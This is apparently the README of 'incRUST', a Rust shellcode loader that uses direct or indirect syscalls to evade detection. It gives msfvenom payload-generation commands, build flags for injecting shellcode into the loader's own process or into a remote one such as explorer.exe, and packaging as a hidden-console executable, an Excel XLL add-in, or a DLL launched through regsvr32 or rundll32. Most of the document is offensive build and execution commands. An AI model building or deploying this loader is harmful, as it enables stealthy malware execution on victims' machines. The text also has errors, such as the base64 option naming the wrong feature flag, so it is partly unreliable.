# incRUST, a rust loader using direct ot indirect syscalls !


(!) indirect syscall in x86 could be not working on some systems becausz of different syscall stubs (https://gist.github.com/wbenny/b08ef73b35782a1f57069dff2327ee4d)


# Payload Test generation
## x86
```shell
msfvenom -f bin -p windows/exec cmd=calc exitfunc=thread -f base64 -o payload-x86.b64
```

## x86_64
### base 64
```shell
msfvenom -f bin -p windows/x64/exec cmd=calc exitfunc=thread -f base64 -o payload-x64.b64
```
### bin
```shell
msfvenom -f bin -p windows/x64/exec cmd=calc exitfunc=thread -f raw -o payload-x64.bin
```


# Build Options
## Payload
### Specifying the file containing the payload
--config "env.PAYLOAD_FILE_NAME.value='payload-x64.b64'"

### Type of payload
- bin
--features=payload_bin
- base64
--features=payload_bin



## injection target
- current process
```shell
--features=inject_self
```
- remote by process id
```shell
--features=inject_proc_id
```
The environment variable should be set at compile time :
```shell
--config "env.PROCESS_ID.value='10360'"
```
- remote process by name
```shell
--features=inject_proc_name
```
The environment variable should be set at compile time :
```shell
--config "env.PROCESS_NAME.value='explorer.exe'"
```

## injection type
- direct syscall
```shell
--features=syscall_direct
```
- indirect syscall
```shell
--features=syscall_indirect
```

# Build Samples
## x64
- executable
```shell
cargo build --bin incrust --target x86_64-pc-windows-gnu --release --features=no_console,payload_b64,inject_proc_name,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x64.b64'" --config "env.PROCESS_NAME.value='explorer.exe'" 
```

- excel library
```shell
cargo build --lib --target x86_64-pc-windows-gnu --release --features=xll,no_console,payload_b64,inject_proc_name,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x64.b64'" --config "env.PROCESS_NAME.value='explorer.exe'" 
```
then rename incrustlib.dll into .xll

- regsvr library
```shell
cargo build --lib --target x86_64-pc-windows-gnu --release --features=regsvr,no_console,payload_b64,inject_proc_name,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x64.b64'" --config "env.PROCESS_NAME.value='explorer.exe'" 
```

To fire : 
```cmd
regsvr32 /s .\incrustlib.dll
```
or
```cmd
rundll32.exe .\incrustlib.dll,DllRegisterServer
```


## x86
```shell
cargo build  --bin incrust --target i686-pc-windows-gnu --release --features=no_console,payload_b64,inject_self,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x86.b64'" 
```

```shell
cargo build --bin incrust --target i686-pc-windows-gnu --features=no_console,payload_b64,inject_proc_name,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x86.b64'" --config "env.PROCESS_NAME.value='explorer.exe'"
```

